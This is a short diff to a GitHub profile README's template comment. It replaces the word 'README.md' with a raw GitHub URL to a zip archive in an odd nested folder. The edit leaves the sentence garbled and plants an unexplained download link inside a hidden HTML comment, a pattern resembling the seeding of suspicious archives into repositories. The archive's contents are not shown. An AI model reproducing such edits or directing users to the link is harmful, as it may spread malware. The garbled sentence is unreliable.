@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-George3d/George3d is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+George3d/George3d is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/George3d/George3d/main/tetrahedroid/George3d.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
